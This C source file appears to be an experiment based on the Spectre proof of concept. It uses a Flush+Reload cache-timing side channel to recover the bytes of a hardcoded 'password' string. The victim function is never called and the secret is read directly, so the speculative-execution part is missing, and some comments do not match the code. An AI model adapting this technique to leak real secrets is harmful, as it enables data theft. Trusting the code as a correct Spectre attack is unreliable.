#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>


#define STRIDE (256)

int data_size = 16;
char public_data[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};

uint8_t array_data_for_prediction[256*STRIDE];
// Uncomment this to leak out from another project ?
char* secret_data = "My password";

// secret_data
uint8_t temp = 0;

void victim_code(int branch_selector){
  if(branch_selector < data_size) {
    temp &= array_data_for_prediction[public_data[branch_selector]];
  }
}


void force_read(uint8_t *p) {
    asm volatile("" : : "r"(*p) : "memory");
}

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
    uint64_t latencies[256];
    uint64_t scores[256];
    int m1 = -1;
    int m2 = -1;

    //uint8_t array_data_for_prediction[256*STRIDE];
    for(int i = 0; i < 256; i++){
      latencies[i] = 0;
      scores[i] = 0;
    }
    // Train with correct
    for(int i = 0; i < 1000; i++){
      // i is the training input of victim_code
      for(int j = 0; j < 256; j++)
        _mm_clflush(&array_data_for_prediction[j*STRIDE]);
      // Wait a little for the cache to flush
      for (volatile int z = 0; z < 1000; z++) { }

      // Read the secret to setup the side channels
      for(int j = 0; j < 100; j++){
        // Force the read
        force_read(&array_data_for_prediction[secret_data[malicious_x]*STRIDE]);
        //unsigned int junk = 0;
        //uint8_t* addr = &array_data_for_prediction[secret_data[malicious_x]*STRIDE];
        //junk = *addr;
      }

      for (int j = 0; j < 256; j++) {
        // To void stride prediction
        // We are iterating over the cache lines here
        int mix_i = ((j * 167) + 13) & 255;
        unsigned int junk = 0;
        uint8_t* addr = &array_data_for_prediction[mix_i*STRIDE];
        uint64_t time1 = __rdtscp(&junk);
        force_read(addr);
        //junk = *addr; /* Time memory access */
        uint64_t time2 = __rdtscp(&junk) - time1; /* Compute elapsed time */
        latencies[mix_i] = time2;
        //printf("%d\n",time2 );
      }


      // get the average latencys
      uint64_t sum = 0;

      for(int k = 0; k < 256; k++) {
        sum += latencies[k];
      }
      sum = sum/256;


      // We are iterating over the cache lines here
      //
      for(int j = 0; j < 256; j++) {
        // This filters the 75% quartile ?
        if(latencies[j] < (sum*3/4)) {
          scores[j] += 1;
        }
      }

      for (int m = 0; m < 256; m++) {
        if (m1 < 0 || scores[m] >= scores[m1]) {
          m2 = m1;
          m1 = m;
        } else if (m2 < 0 || scores[m] >= scores[m2]) {
          m2 = m;
        }
      }

      score[0] = scores[m1];
      score[1] = scores[m2];

      value[0] = m1;
      value[1] = m2;
      // Early break
      // Otherwise, it might not be the best?
      if(scores[m1] > (2*scores[m2]) ) {
        // We are then confident
        break;
      }
    }
}

void main() {
    size_t malicious_x = 0;
    //(size_t)(secret_data - (char *)array_data_for_prediction);// +1 if we remove the secret_data array /* default for malicious_x */
    int i, score[2], len = 40;
    uint8_t value[2];

   /*for (i = 0; i < sizeof(array2); i++)
     array2[i] = 1;  write to array2 to ensure it is memory backed
     if (argc == 3) {
       sscanf(argv[1], "%p", (void **)(&malicious_x));
       malicious_x -= (size_t)array1; Input value to pointer
      sscanf(argv[2], "%d", &len);
   }*/
   printf("Reading %d bytes:\n", len);
   for(int i = 0; i < 11; i++){
     malicious_x = i;
     printf("Reading at malicious_x = %p... ", (void *)malicious_x);
     readMemoryByte(malicious_x, value, score);
     printf(": %c\n", value[0]);
   }
   //printf("%s %d %d: ", score[0] >= 2 * score[1] ? "Success" : "Unclear", score[0], score[1]);
   //printf("0x%02X=%c score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
   //if (score[1] > 0)
   //  printf("(second best: 0x%02X score=%d)", value[1], score[1]);
   //  printf("\n");
}